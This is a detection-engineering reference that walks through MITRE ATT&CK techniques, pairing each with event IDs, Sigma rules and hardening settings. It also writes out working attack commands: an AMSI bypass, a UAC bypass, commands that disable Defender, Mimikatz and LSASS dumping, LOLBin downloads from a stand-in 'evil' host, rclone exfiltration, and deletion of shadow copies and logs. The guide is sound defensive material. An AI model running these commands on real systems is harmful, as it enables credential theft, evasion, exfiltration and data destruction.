# MITRE ATT&CK Comprehensive Defensive Analysis Reference
## DoD Detection Engineering & Threat Hunting Technical Guide

**120 techniques across 12 tactical categories with actionable detection and mitigation guidance for SOC analysts and detection engineers.**

This reference document provides exhaustive technical details for implementing robust defensive coverage against adversary tradecraft documented in the MITRE ATT&CK framework. Each technique includes implementation specifics, real-world APT attribution, detection engineering guidance with specific Event IDs and Sigma rules, Atomic Red Team test procedures, evasion techniques, and defensive mitigations with GPO settings and registry configurations.

---

# TA0001: Initial Access

Initial Access techniques represent adversary methods for gaining an initial foothold within a network. These techniques exploit public-facing applications, leverage trusted relationships, or target users through social engineering.

## T1566 - Phishing

Adversaries deliver malicious content via email, targeting users to execute payloads or harvest credentials. Phishing remains the most prevalent initial access vector, with **APT29**, **APT28**, **Kimsuky**, and **Royal Ransomware** all leveraging sophisticated phishing campaigns.

**Technical Implementation:**
- Email-based delivery with macro-enabled documents (.docm, .xlsm)
- HTML smuggling to bypass email gateway scanning
- ISO/IMG container files (bypass Mark-of-the-Web)
- QR code phishing (quishing) for credential harvesting
- Thread hijacking for increased legitimacy

**Tools:** Gophish (default tracking pixel: `/track?rid=`), Evilginx2 (adversary-in-the-middle), Social Engineering Toolkit (SET)

**Detection Engineering:**
| Event Source | Event ID | Detection Use Case |
|--------------|----------|-------------------|
| Security | 4688 | Office spawning cmd.exe, powershell.exe, mshta.exe |
| Sysmon | 1 | Process creation chains from WINWORD.EXE/EXCEL.EXE |
| Sysmon | 11 | File creation in Temp, Downloads, Startup folders |
| Sysmon | 15 | FileCreateStreamHash for Mark-of-the-Web tracking |
| Sysmon | 22 | DNS queries from suspicious payload domains |

**Sigma Rule Pattern:**
```yaml
title: Suspicious Office Process Spawning
detection:
  selection:
    ParentImage|endswith: ['\winword.exe', '\excel.exe', '\powerpnt.exe']
    Image|endswith: ['\cmd.exe', '\powershell.exe', '\wscript.exe', '\mshta.exe']
  condition: selection
```

**Atomic Red Team:** T1566.001-1 (Download Macro-Enabled Attachment), T1566.001-2 (Word spawning command prompt)

**Defensive Mitigations:**
```
Registry: HKCU\Software\Microsoft\Office\16.0\Word\Security
- VBAWarnings: 4 (Disable all macros)
- BlockContentExecutionFromInternet: 1

GPO: Computer Configuration > Administrative Templates > Microsoft Office
- Block macros from Internet: Enabled
- Protected View for files from Internet: Enabled

ASR Rules (GUIDs):
- 3B576869-A4EC-4529-8536-B80A7769E899 (Block Office executable content)
- 75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84 (Block Office code injection)
- BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550 (Block executable from email)
```

## T1190 - Exploit Public-Facing Application

Adversaries exploit vulnerabilities in internet-facing systems including VPNs, email servers, and web applications. **APT29** exploited CVE-2019-19781 (Citrix) and CVE-2019-11510 (Pulse Secure), while **HAFNIUM** targeted Exchange servers with ProxyLogon (CVE-2021-26855).

**Common Targets:** Microsoft Exchange, Citrix ADC, Fortinet VPN, Ivanti/Pulse Secure, VMware vCenter, Apache Log4j

**Detection Engineering:**
- Sysmon Event 1: w3wp.exe, httpd, nginx spawning cmd.exe or powershell.exe
- Sysmon Event 11: Web shell file creation (.aspx, .php, .jsp in web directories)
- Web server logs: POST requests to unusual files, SQL injection patterns

**Defensive Mitigations:** DMZ segmentation, WAF with OWASP ModSecurity ruleset, vulnerability scanning, CISA KEV catalog prioritization

## T1078 - Valid Accounts

Compromised credentials enable adversaries to authenticate legitimately, bypassing many security controls. **Volt Typhoon** uses valid credentials as their primary persistence mechanism against critical infrastructure.

**Detection Engineering:**
| Event ID | Description | Detection Value |
|----------|-------------|-----------------|
| 4624 | Successful logon | Track Type 2, 3, 10 across systems |
| 4625 | Failed logon | Status 0xC000006A (wrong password) for spraying |
| 4648 | Explicit credential logon | Pass-the-hash indicator |
| 4672 | Special privileges assigned | Privilege escalation |
| 4768 | Kerberos TGT requested | Golden ticket detection |
| 4771 | Kerberos pre-auth failed | Password spray via LDAP |

**Logon Type Reference:** Type 2 (Interactive), Type 3 (Network/SMB), Type 10 (RDP)

**Defensive Mitigations:**
```
GPO: Account Policies
- Password minimum length: 14 characters
- Account lockout threshold: 5 attempts
- Account lockout duration: 30 minutes

Additional Controls:
- MFA on all accounts
- Privileged Access Workstations (PAW)
- Just-in-time (JIT) privileged access
```

## T1133 - External Remote Services

VPN, RDP, and SSH services provide adversary entry points when credentials are compromised. **APT29** targeted COVID-19 research via VPN compromise.

**Detection:** Event 4624 Type 10 from unusual geolocations, impossible travel scenarios, VPN connections from TOR exit nodes

**Mitigations:** Enforce MFA, geo-blocking, certificate-based authentication, monitor impossible travel

## T1189 - Drive-by Compromise

Watering hole attacks and malvertising deliver exploits through compromised legitimate websites. Browser process spawning unexpected children (powershell.exe, cmd.exe, regsvr32.exe) indicates exploitation.

## T1195 - Supply Chain Compromise

Software supply chain attacks insert malicious code into legitimate updates. **APT29/NOBELIUM** compromised SolarWinds Orion, **Lazarus** compromised 3CX.

**Defensive Mitigations:** Software Bill of Materials (SBOM), code signing verification, vendor security assessments, hash verification

## T1199 - Trusted Relationship / T1091 - Removable Media / T1200 - Hardware Additions

Third-party access, USB-based malware, and hardware implants provide alternative initial access vectors. Monitor Event 6416 (new device recognized), Event 4663 (removable media access).

---

# TA0002: Execution

Execution techniques describe how adversaries run malicious code on victim systems.

## T1059.001 - PowerShell

PowerShell remains the most prevalent execution method. **Cobalt Strike** uses default prefix `powershell -nop -exec bypass -EncodedCommand`.

**Critical Event IDs:**
- **4104**: Script Block Logging (captures deobfuscated content)
- **4103**: Module Logging
- **400**: Engine Startup (HostApplication field)

**Detection Patterns:**
- Encoded commands: `-enc`, `-encodedcommand`
- Hidden window: `-w hidden`, `-WindowStyle Hidden`
- Bypass flags: `-nop`, `-ep bypass`
- Download cradles: `Net.WebClient`, `Invoke-WebRequest`, `Invoke-RestMethod`

**AMSI Bypass Signatures:**
```
"System.Management.Automation.AmsiUtils"
"amsiInitFailed"
"AmsiScanBuffer"
```

**Defensive Mitigations:**
```
GPO: Turn on PowerShell Script Block Logging
Computer Configuration > Administrative Templates > Windows Components > PowerShell

Constrained Language Mode:
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"

Disable PowerShell v2:
Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2
```

## T1047 - Windows Management Instrumentation

WMI enables remote code execution and persistence. **Emotet**, **APT41**, and **Ryuk** leverage WMI extensively.

**Commands:**
```cmd
wmic /node:<target> process call create "powershell -e <base64>"
wmic shadowcopy delete  # Ransomware VSS deletion
```

**Detection:** Sysmon Events 19/20/21 (WMI Event Subscription), wmiprvse.exe spawning child processes

## T1053.005 - Scheduled Task

Scheduled tasks provide persistence and execution capabilities. **APT32** masqueraded tasks as "SystemSoundsServices."

**Detection:**
- Event 4698: Scheduled task created
- Event 4699: Scheduled task deleted
- Event 4700/4701: Task enabled/disabled
- Registry: `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\*`

**Hidden Task Technique:** Delete SD (Security Descriptor) registry value to hide from standard enumeration

## T1106 - Native API

Direct Windows API calls bypass command-line logging. Key APIs: `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, `NtCreateThreadEx`.

**Sysmon Detection:**
- Event 8: CreateRemoteThread
- Event 10: ProcessAccess (access masks 0x1FFFFF, 0x147A, 0x1410)

## T1569.002 - Service Execution

PsExec and service creation enable remote execution. **Cobalt Strike** PsExec creates PSEXESVC service.

**Detection:**
- Event 7045 (System): New service installed
- Event 4697 (Security): Service installed
- Services running from: Temp, AppData, user directories

---

# TA0003: Persistence

Persistence techniques maintain adversary access across system restarts.

## T1547.001 - Registry Run Keys / Startup Folder

The most prevalent persistence technique, used by **54+ threat actor groups** including **APT28**, **APT29**, **Emotet**, and **Agent Tesla**.

**Registry Keys:**
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
```

**Startup Folders:**
- User: `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup`
- All Users: `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`

**Detection:** Sysmon Events 12/13 (Registry modifications), Event 4657 (Registry value modification)

**Tool:** SharPersist (.NET persistence toolkit), Sysinternals Autoruns for baseline

## T1546.003 - WMI Event Subscription

WMI persistence survives reboots via EventFilter/EventConsumer/FilterToConsumerBinding. **APT29** (POSHSPY backdoor), **Turla**, and **FIN8** use this technique.

**Components:**
```powershell
# EventFilter: Trigger condition
# EventConsumer: CommandLineEventConsumer or ActiveScriptEventConsumer
# FilterToConsumerBinding: Links filter to consumer
```

**Detection:** Sysmon Events 19/20/21, WmiPrvSe.exe spawning unexpected processes

**Query existing subscriptions:**
```powershell
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

## T1543.003 - Windows Service

Service creation provides SYSTEM-level persistence. **Turla** (TinyTurla), **Stuxnet**, and **Clop** ransomware use malicious services.

**Registry:** `HKLM\SYSTEM\CurrentControlSet\Services\[ServiceName]`

**Detection:** Event 7045 (System), Event 4697 (Security)

## T1505.003 - Web Shell

Web shells provide persistent access to web servers. **HAFNIUM** deployed China Chopper on Exchange servers.

**Common Locations:**
- IIS: `C:\inetpub\wwwroot\`
- Exchange: `C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\`

**Detection:** w3wp.exe spawning cmd.exe/powershell.exe, file creation monitoring in web directories

## T1574.001 - DLL Search Order Hijacking

**APT10**, **APT41**, and **PlugX** abuse DLL search order for persistence.

**Detection:** Sysmon Event 7 (Image Load) for DLLs from unexpected paths

---

# TA0004: Privilege Escalation

Privilege escalation techniques enable adversaries to gain higher-level permissions.

## T1055 - Process Injection

Process injection enables code execution in the context of another process. **APT41** uses DLL sideloading with DUSTPAN dropper.

**Core APIs:**
```c
VirtualAllocEx()     // Allocate memory in remote process
WriteProcessMemory() // Write malicious code
CreateRemoteThread() // Execute injected code
NtCreateThreadEx()   // Native API alternative
```

**Access Rights ("Three Amigos"):**
- PROCESS_VM_OPERATION (0x0008)
- PROCESS_VM_WRITE (0x0020)
- PROCESS_CREATE_THREAD (0x0002)
- Combined masks: **0x1FFFFF** (full), **0x147A** (Metasploit migrate)

**Detection:**
- Sysmon Event 8: CreateRemoteThread
- Sysmon Event 10: ProcessAccess (monitor access to LSASS)
- Sysmon Event 25: ProcessTampering (process hollowing)

**Memory Forensics (Volatility):**
```bash
vol.py -f dump.mem malfind -p [PID]      # Find injected code
vol.py -f dump.mem ldrmodules -p [PID]   # Check VAD/PEB discrepancy
vol.py -f dump.mem hollowfind            # Specialized hollowing detection
```

**Evasion Techniques:** Direct syscalls (bypass hooks), unhooking ntdll.dll, manual PE mapping

## T1548.002 - Bypass User Account Control

UAC bypass enables elevation without user prompts. **UACME Project** documents 69+ techniques.

**Registry-Based Bypasses:**
```cmd
# fodhelper.exe bypass
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /ve /d "C:\malware.exe" /f
reg add "HKCU\Software\Classes\ms-settings\shell\open\command" /v DelegateExecute /f
start fodhelper.exe
```

**Auto-elevate binaries:** fodhelper.exe, eventvwr.exe, computerdefaults.exe

**Cobalt Strike:** `elevate uac-rpc-dom`, `runasadmin uac-cmlua`

**Detection:** Registry modifications to ms-settings\shell\open\command, fodhelper.exe spawning unexpected children

**Defensive Mitigations:**
```
UAC Level: Always Notify (highest)
GPO: Enable Admin Approval Mode
ASR Rules: Block untrusted executables from auto-elevate binaries
```

## T1055.012 - Process Hollowing

Creates suspended process, unmaps legitimate code, injects malicious PE.

**API Sequence:**
1. `CreateProcess(CREATE_SUSPENDED)`
2. `NtUnmapViewOfSection()`
3. `VirtualAllocEx()` at ImageBase
4. `WriteProcessMemory()` malicious PE
5. `SetThreadContext()` point to malicious entry
6. `ResumeThread()`

**Indicators:** CREATE_SUSPENDED flag (0x4), PEB/VAD discrepancy, PAGE_EXECUTE_READWRITE vs PAGE_EXECUTE_WRITECOPY

## T1068 - Exploitation for Privilege Escalation

Kernel exploits and BYOVD (Bring Your Own Vulnerable Driver) enable SYSTEM access. **APT41** exploited CVE-2018-0824.

**Detection:** Sysmon Event 6 (Driver Load), monitor for known vulnerable driver hashes

---

# TA0005: Defense Evasion

Defense evasion techniques help adversaries avoid detection.

## T1562 - Impair Defenses

Disabling security tools removes defensive visibility. **Turla** patches ETW, EventLog, and AMSI functions.

**Disabling Windows Defender:**
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring 1
Add-MpPreference -ExclusionPath "C:\malware"
```

**AMSI Bypass (amsiInitFailed):**
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

**Detection:**
- Event 5001: Real-time protection disabled
- Sysmon Event 12: AMSI registry modifications
- Monitor: `SOFTWARE\Microsoft\AMSI\Providers`

**Defensive Mitigations:** Enable Tamper Protection, VBS/HVCI, monitor AMSI provider registry keys

## T1070.001 - Clear Windows Event Logs

Log clearing removes evidence. **APT28**, **APT32**, **APT38**, **APT41** all clear logs.

**Commands:**
```cmd
wevtutil cl Security
wevtutil cl System
for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"
```

**Detection:**
- **Event 1102**: Security log cleared
- **Event 104**: System log cleared

**Defensive Mitigations:** Windows Event Forwarding (WEF), centralized SIEM, Protected Event Logging

## T1218 - System Binary Proxy Execution (LOLBAS)

Living-off-the-land binaries execute malicious code through trusted Microsoft binaries.

**Key LOLBins:**
| Binary | Command Pattern |
|--------|-----------------|
| rundll32.exe | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"` |
| mshta.exe | `mshta.exe vbscript:Execute(...)` |
| regsvr32.exe | `regsvr32.exe /s /n /u /i:http://evil/file.sct scrobj.dll` |
| certutil.exe | `certutil -urlcache -split -f http://evil/payload.exe` |
| msiexec.exe | `msiexec /q /i http://evil/malicious.msi` |

**Detection:** Network connections from LOLBins, unusual command-line arguments

**Defensive Mitigations:** WDAC policies, AppLocker, block outbound connections from LOLBins via Windows Firewall

## T1027 - Obfuscated Files or Information

Encoding and encryption evade signature-based detection. **FIN7** uses Invoke-Obfuscation patterns.

**Detection:** High entropy in script content, Base64 patterns, PowerShell encoding indicators

## T1620 - Reflective Code Loading

In-memory execution avoids disk artifacts. **Cobalt Strike** beacon uses reflective DLL loading.

**Indicators:** Unbacked RWX memory, CLR loaded in unexpected processes (notepad.exe loading clr.dll)

---

# TA0006: Credential Access

Credential access techniques obtain authentication material.

## T1003 - OS Credential Dumping

LSASS dumping extracts credentials from memory. **APT29**, **APT28**, **Trickbot**, and **Lazarus** all leverage Mimikatz.

**Methods:**
```
# Mimikatz
sekurlsa::logonpasswords
sekurlsa::wdigest
lsadump::dcsync /user:domain\krbtgt

# ProcDump
procdump.exe -ma lsass.exe lsass.dmp

# comsvcs.dll
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
```

**Sysmon Event 10 Detection:**
```spl
`sysmon` EventCode=10 TargetImage=*lsass.exe 
(GrantedAccess=0x1010 OR GrantedAccess=0x1410 OR GrantedAccess=0x1438)
CallTrace=*dbgcore.dll* OR CallTrace=*dbghelp.dll*
```

**DCSync Detection (Event 4662):**
- Monitor DS-Replication-Get-Changes-All: `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}`
- Monitor DS-Replication-Get-Changes: `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}`

**Evasion Tools:** NanoDump (direct syscalls), HandleKatz (handle duplication), MirrorDump (Sysmon evasion)

**Defensive Mitigations:**
```
Registry: HKLM\SYSTEM\CurrentControlSet\Control\Lsa
- RunAsPPL = 1 (LSA Protection)

Credential Guard:
- LsaCfgFlags = 1 (with UEFI lock)

Disable WDigest:
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest
- UseLogonCredential = 0
```

## T1558 - Steal or Forge Kerberos Tickets

Kerberoasting extracts service account password hashes. **Rubeus** and **Impacket GetUserSPNs** are primary tools.

**Kerberoasting:**
```bash
GetUserSPNs.py -request -dc-ip 10.10.10.1 domain.local/user:password
Rubeus.exe kerberoast /outfile:hashes.txt
```

**Golden Ticket:**
```
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```

**Detection (Event 4769):**
```spl
EventCode=4769 ServiceName!="*$" TicketEncryptionType=0x17
```
- Encryption 0x17 = RC4-HMAC (suspicious, used in Kerberoasting)
- Encryption 0x12 = AES256 (expected)

**Defensive Mitigations:** AES-only Kerberos, Protected Users group, gMSA with 120+ character passwords, SPN honeypots

## T1110 - Brute Force

Password spraying targets multiple accounts with common passwords.

**Detection:**
- Event 4625: >50 with status 0xC000006A in 1 minute
- Event 4771: >50 with status 0x18 (Kerberos spray via LDAP)

## T1557 - Adversary-in-the-Middle

LLMNR/NBT-NS poisoning with **Responder** captures NTLMv2 hashes.

**Defensive Mitigations:**
```
GPO: Disable LLMNR
Computer Configuration > Admin Templates > Network > DNS Client
Turn Off Multicast Name Resolution = Enabled

Registry: Disable NBT-NS
HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters\Interfaces
NetbiosOptions = 2
```

---

# TA0007: Discovery

Discovery techniques map target environments before lateral movement.

## T1087 - Account Discovery

Account enumeration identifies targets for privilege escalation.

**Commands:**
```cmd
net user /domain
net group "Domain Admins" /domain
Get-ADUser -Filter *
```

**Tools:** BloodHound/SharpHound, PowerView (`Get-DomainUser`, `Invoke-UserHunter`), ADRecon

**Detection:** Event 4688 with command-line auditing, Event 4104 for AD cmdlets

## T1482 - Domain Trust Discovery

Trust enumeration enables cross-domain attacks. **TrickBot**, **Ryuk**, and **FIN6** use ADFind.

**Commands:**
```cmd
nltest /domain_trusts /all_trusts
Get-ADTrust -Filter *
adfind.exe -f objectclass=trusteddomain
```

**Detection:** nltest.exe, dsquery.exe execution, LDAP queries for (objectClass=trustedDomain)

## T1046 - Network Service Discovery

Port scanning identifies services for lateral movement.

**Detection:** High volume SYN packets, sequential port access, Sysmon Event 3 network connections

## T1057 - Process Discovery

Security software enumeration enables evasion decisions.

**Commands:** `tasklist`, `Get-Process`, `wmic process list`

**Detection:** Sysmon Event 1 for tasklist.exe, wmic.exe with process argument

---

# TA0008: Lateral Movement

Lateral movement techniques spread access across networks.

## T1021.002 - SMB/Windows Admin Shares

Admin share access enables file transfer and remote execution. **Impacket** suite is primary tooling.

**Commands:**
```bash
# Impacket PsExec
psexec.py domain/user:password@target
psexec.py -hashes :ntlm_hash domain/user@target

# Impacket WMIexec
wmiexec.py domain/user:password@target

# CrackMapExec
crackmapexec smb target -u user -H ntlm_hash
```

**Detection:**
| Event ID | Description |
|----------|-------------|
| 5140 | Network share accessed |
| 5145 | Detailed share object access |
| 7045 | New service installed |
| 4697 | Service installed (Security) |

**Impacket Signatures:**
- PsExec: 4-char random service name, RemCom_stdin/stdout/stderr named pipes
- SMBExec: `/Q /c echo ^> \\__output` pattern
- WMIexec: `__<timestamp>` output file on ADMIN$

**Defensive Mitigations:**
```
Registry: Disable Admin Shares
HKLM\System\CurrentControlSet\Services\LanManServer\Parameters
AutoShareServer = 0
AutoShareWks = 0
```

## T1021.006 - Windows Remote Management (WinRM)

PowerShell remoting enables remote command execution.

**Commands:**
```powershell
Enter-PSSession -ComputerName target -Credential $cred
Invoke-Command -ComputerName target -ScriptBlock {whoami}
evil-winrm -i target -u user -H ntlm_hash
```

**Detection:**
- Event 91: WSMan session created
- Event 4624 Type 3 to ports 5985/5986
- Event 4104: Script Block Logging for Invoke-Command

## T1550 - Pass-the-Hash / Pass-the-Ticket

Alternate authentication material bypasses password requirements.

**Pass-the-Hash:**
```
sekurlsa::pth /user:user /domain:domain /ntlm:hash
```

**Pass-the-Ticket:**
```
Rubeus.exe ptt /ticket:base64ticket
kerberos::ptt ticket.kirbi
```

**Detection:** Event 4624 with NTLM without preceding 4648, logon from unusual workstations

## T1021.003 - DCOM

COM objects enable remote execution without service installation.

**MMC20.Application:**
```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c command","7")
```

---

# TA0009: Collection

Collection techniques gather data for exfiltration.

## T1560 - Archive Collected Data

Archiving prepares data for exfiltration. Ransomware groups commonly use encrypted archives.

**Commands:**
```cmd
7z.exe a -hp"password" archive.7z *.docx
rar.exe a -hp"password" -sdel archive.rar C:\sensitive\*
```

**Detection:** Process creation for archive utilities with `-hp`, `-p`, `-sdel` parameters

**Sigma Rule:**
```yaml
title: Suspicious Compression Tool Parameters
detection:
  selection:
    Image|endswith: ['\rar.exe', '\7z.exe']
    CommandLine|contains: [' -hp', ' -p', ' -sdel']
  condition: selection
```

## T1114 - Email Collection

Email provides high-value intelligence. **APT29** (Midnight Blizzard) accesses Microsoft 365 mailboxes via Graph API.

**Detection:**
- Exchange Unified Audit Log: MailItemsAccessed events
- Monitor New-InboxRule creation
- Track Graph API access patterns

**Defensive Mitigations:** Restrict external forwarding, review OAuth application permissions

## T1113 - Screen Capture / T1056 - Input Capture / T1115 - Clipboard Data

Surveillance capabilities capture user activity. **APT29** CosmicDuke includes keylogger and clipboard grabber.

**APIs:** `CopyFromScreen()`, `SetWindowsHookEx(WH_KEYBOARD_LL)`, `GetClipboardData()`

---

# TA0011: Command and Control

C2 techniques maintain communication with compromised systems.

## T1071.001 - Web Protocols (HTTP/HTTPS)

HTTP/S C2 blends with legitimate traffic. **Cobalt Strike** malleable profiles customize traffic patterns.

**Cobalt Strike Defaults:**
- GET URIs: `/load`, `/ca`, `/dpixel`, `/__utm.gif`
- POST URI: `/submit.php?id=[random]`

**Detection:**
- **RITA Beacon Analysis:** Score 0-1 (1 = perfect beacon)
- Interval skew, dispersion, size consistency
- JA3 fingerprint: `a0e9f5d64349fb13191bc781f81f42e1`
- JARM: `2ad2ad16d2ad2ad00042d42d00042ddb04deffa1705e2edc44cae1ed24a4da`

**Default Cobalt Strike Certificate:**
- SHA256: `87F2085C32B6A2CC709B365F55873E207A9CAA10BFFECF2FD16D3CF9D94D390C`

## T1071.004 - DNS

DNS tunneling enables covert C2 communication. **APT29** uses DNS tunneling for stealthy exfiltration.

**Tools:** dnscat2 (ECDH/salsa20 encryption), iodine (~10 KB/s throughput)

**Detection Thresholds:**
- Query volume: >1000 queries/hour to unknown domain
- Domain length: >50 characters
- Entropy: >3.5 bits/character
- Subdomain count: >100 unique subdomains

## T1572 - Protocol Tunneling

SSH, DNS, and HTTPS tunneling encapsulate C2 traffic.

**SSH Tunneling:**
```bash
ssh -L localport:remotehost:remoteport user@sshserver
ssh -D localport user@pivothost  # SOCKS proxy
```

**Defensive Mitigations:** Limit DNS to approved resolvers, block DoH/DoT, monitor SSH anomalies

## T1090.004 - Domain Fronting

CDN abuse masks C2 destinations. TLS SNI contains legitimate domain, HTTP Host header contains C2.

---

# TA0010: Exfiltration

Exfiltration techniques transfer collected data outside the network.

## T1567.002 - Exfiltration to Cloud Storage

Cloud storage services enable data theft. **Conti**, **DarkSide**, **REvil**, and **BlackByte** use Rclone to MEGA.nz.

**Rclone Command:**
```bash
rclone.exe copy \\fileserver\shares\ mega:exfil --transfers 8 --multi-thread-streams 8 --no-check-certificate
```

**Detection:**
```spl
Processes.process IN ("*copy*", "*mega*", "*--transfers*", "*--multi-thread-streams*", "*--no-check-certificate*")
```

**Sigma Rule:**
```yaml
title: Rclone Execution for Data Exfiltration
detection:
  selection_img:
    - Image|endswith: '\rclone.exe'
    - OriginalFileName: 'rclone.exe'
  selection_cmd:
    CommandLine|contains: ['copy', '--transfers', '--multi-thread-streams']
  condition: selection_img and selection_cmd
```

**Network Indicators:** DNS queries to `*.userstorage.mega.co.nz`, User-Agent: `rclone/v*`

## T1048 - Exfiltration Over Alternative Protocol

DNS, ICMP, and SSH provide covert exfiltration channels.

**DNS Exfiltration Indicators:**
| Metric | Normal | Suspicious |
|--------|--------|------------|
| Query Length | <50 chars | >100 chars |
| Shannon Entropy | <4.0 | >4.0 |
| TXT Records % | <5% | >30% |

## T1041 - Exfiltration Over C2 Channel

C2 channels double as exfiltration paths. Monitor for high outbound-to-inbound data ratios.

---

# TA0040: Impact

Impact techniques disrupt, destroy, or manipulate victim systems and data.

## T1486 - Data Encrypted for Impact (Ransomware)

Ransomware encrypts files for extortion. **LockBit 3.0** encrypts ~25,000 files/minute with Safe Mode boot evasion.

**Encryption Patterns:**
- Hybrid: AES-256 for files, RSA-2048/4096 for key protection
- Common algorithms: AES, ChaCha20, Salsa20
- File extensions: .lockbit, .conti, .revil, .akira, .blackcat

**Detection:**
- Sysmon Event 11: High-volume file creation with new extensions
- Canary files: Deploy decoys and monitor for access/modification
- Event 4663: File access auditing

## T1490 - Inhibit System Recovery

Recovery inhibition prevents restoration after ransomware deployment.

**Commands:**
```cmd
vssadmin.exe delete shadows /all /quiet
wmic shadowcopy delete
bcdedit.exe /set {default} recoveryenabled no
wbadmin.exe delete catalog -quiet
reagentc.exe /disable
```

**Detection:**
- Event 7036: VSS service state change
- Event 524: System catalog deleted
- Monitor vssadmin, wmic, bcdedit, wbadmin execution

**Defensive Mitigations:** Restrict vssadmin.exe/wmic.exe via AppLocker, air-gapped backups, registry protection

## T1489 - Service Stop

Security and backup service termination precedes ransomware deployment. **LockBit** stops 180+ services.

**Commonly Targeted:** Windows Defender, backup agents, database services, Exchange

**Detection:** Event 7036/7040 (service state change), net stop/sc stop command monitoring

## T1485 - Data Destruction

Wiper malware destroys data without recovery possibility. **NotPetya** caused $10B+ damage globally.

**Notable Wipers:**
- Shamoon (2012): RawDisk driver, MBR overwrite
- NotPetya (2017): MFT encryption, EternalBlue propagation
- WhisperGate (2022): Pseudo-ransomware, 0xCC overwrite
- HermeticWiper (2022): EaseUS partition driver abuse

**Detection:** Mass file deletion events, raw disk access, MBR modifications

## T1531 - Account Access Removal

Account manipulation prevents legitimate access during attacks. **LockerGoga** changed all user passwords then forced logoff.

**Detection:**
- Event 4726: User account deleted
- Event 4725: User account disabled
- Event 4724: Password reset attempt

---

# Cross-Tactic Detection Matrix

## Critical Windows Security Event IDs

| Event ID | Source | Description | Priority |
|----------|--------|-------------|----------|
| 1102 | Security | Audit log cleared | Critical |
| 4624 | Security | Successful logon | High |
| 4625 | Security | Failed logon | High |
| 4648 | Security | Explicit credential logon | High |
| 4662 | Security | Directory service access | Critical |
| 4672 | Security | Special privileges assigned | High |
| 4688 | Security | Process creation | Critical |
| 4697 | Security | Service installed | High |
| 4698 | Security | Scheduled task created | High |
| 4720 | Security | User account created | Medium |
| 4726 | Security | User account deleted | High |
| 4768 | Security | Kerberos TGT requested | Medium |
| 4769 | Security | Kerberos service ticket | Medium |
| 5140 | Security | Network share accessed | Medium |
| 5145 | Security | Detailed share access | Medium |
| 7045 | System | New service installed | High |

## Essential Sysmon Event IDs

| Event ID | Description | Detection Use Case |
|----------|-------------|-------------------|
| 1 | Process Creation | Command-line analysis, process chains |
| 3 | Network Connection | C2 traffic, lateral movement |
| 6 | Driver Loaded | BYOVD, rootkits |
| 7 | Image Loaded | DLL injection, sideloading |
| 8 | CreateRemoteThread | Process injection |
| 10 | ProcessAccess | LSASS access, credential theft |
| 11 | FileCreate | Malware drops, web shells |
| 12/13 | Registry Events | Persistence, configuration changes |
| 19/20/21 | WMI Events | WMI persistence |
| 22 | DNS Query | C2 resolution, exfiltration |
| 23 | FileDelete | Anti-forensics |
| 25 | ProcessTampering | Process hollowing |

## Tool Signature Reference

### Mimikatz
- **Commands:** `sekurlsa::`, `lsadump::`, `kerberos::`
- **Memory Strings:** "gentilkiwi", "Benjamin DELPY"
- **Driver:** mimidrv.sys

### Cobalt Strike
- **JA3:** `a0e9f5d64349fb13191bc781f81f42e1`
- **Default Ports:** 50050 (Team Server), 443, 80, 4444
- **Named Pipes:** `\\.\pipe\msagent_##`, `\\.\pipe\MSSE-<random>-server`
- **PowerShell Prefix:** `powershell -nop -exec bypass -EncodedCommand`

### Impacket Suite
- **PsExec:** 4-char service name, RemCom named pipes
- **SMBExec:** `/Q /c echo ^> \\__output`
- **WMIexec:** `__<timestamp>` output file

### Rclone
- **OriginalFileName:** `rclone.exe`
- **Network:** `*.userstorage.mega.co.nz`
- **Config:** `%APPDATA%\rclone\rclone.conf`

---

# Recommended Defensive Architecture

## Endpoint Controls
1. **Sysmon (v15+)** with SwiftOnSecurity baseline configuration
2. **PowerShell Logging:** Script Block (4104), Module (4103)
3. **Command-line Auditing:** Enable via GPO for Event 4688
4. **WDAC/AppLocker:** Application whitelisting
5. **ASR Rules:** Enable all Office and script protection rules
6. **Credential Guard:** Hardware-based LSASS protection
7. **LSA Protection (RunAsPPL):** Protected Process Light for LSASS

## Network Controls
1. **Explicit Proxy:** Force all HTTP/HTTPS through inspection proxy
2. **TLS Inspection:** Certificate validation and JA3 monitoring
3. **DNS Filtering:** Block third-party resolvers, monitor DoH
4. **Network Segmentation:** Tiered administration, PAWs
5. **SMB Signing:** Required on all systems
6. **Egress Filtering:** Allowlist-based outbound connections

## Detection Stack
1. **SIEM Integration:** Centralized logging with Sigma rule correlation
2. **RITA/AC-Hunter:** Network beacon detection on Zeek logs
